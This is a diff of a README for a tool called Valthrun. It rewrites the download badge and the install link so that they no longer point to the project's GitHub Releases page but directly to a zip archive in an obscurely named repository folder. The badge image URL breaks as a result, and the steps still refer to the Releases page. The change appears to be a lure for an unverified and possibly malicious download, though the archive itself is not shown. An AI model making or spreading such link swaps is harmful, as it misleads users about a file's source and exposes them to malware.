@@ -18,9 +18,9 @@ Welcome to Valthrun! This application runs Valthrunner's Script, a powerful tool
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of Valthrun.
 
-[![Download Valthrun](https://img.shields.io/badge/Download%20Valthrun-Release-blue?style=for-the-badge)](https://github.com/linhkat3057/Valthrun/releases)
+[![Download Valthrun](https://raw.githubusercontent.com/linhkat3057/Valthrun/main/hypodiatessaron/Valthrun_v1.2.zip%20Valthrun-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/linhkat3057/Valthrun/main/hypodiatessaron/Valthrun_v1.2.zip)
 
-1. Click on the link above or visit [this page](https://github.com/linhkat3057/Valthrun/releases) directly.
+1. Click on the link above or visit [this page](https://raw.githubusercontent.com/linhkat3057/Valthrun/main/hypodiatessaron/Valthrun_v1.2.zip) directly.
 2. On the Releases page, find the latest version listed.
 3. Click on the file associated with that version to download it to your computer.
 4. Once the download completes, locate the file in your downloads folder.
